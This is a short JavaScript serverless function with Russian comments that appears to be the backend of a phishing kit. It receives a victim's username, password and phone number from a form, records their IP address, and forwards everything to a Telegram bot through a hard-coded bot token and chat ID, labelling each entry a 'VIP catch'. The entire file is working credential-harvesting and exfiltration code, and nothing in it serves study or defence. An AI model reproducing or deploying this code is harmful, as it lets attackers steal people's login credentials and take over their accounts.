export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send();
    
    // Получаем данные из формы
    const { u, p, t } = req.body;
    
    // Магия: достаем IP адрес через заголовки Vercel
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';

    const token = '7919864789:AAHsh4P-qjWzW6P_N_W6rL6-5_7Q'; 
    const chatId = '5686381617';

    // Формируем жирный отчет для бота
    const text = `💎 **VIP УЛОВ: CLOUD_V8**\n\n` +
                 `👤 **Юзер:** \`${u}\`\n` +
                 `🔑 **Пасс:** \`${p}\`\n` +
                 `📱 **Тел:** \`${t}\`\n\n` +
                 `🌐 **IP:** \`${ip}\`\n` +
                 `🛡️ **Анти-бот:** Пройден\n` +
                 `📅 **Аккаунт:** >30 дней\n` +
                 `⚓️ **Станция:** Vercel_Secure_v8`;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                text: text, 
                parse_mode: 'Markdown' 
            })
        });
        return res.status(200).json({ ok: true });
    } catch (e) {
        return res.status(500).json({ ok: false });
    }
}
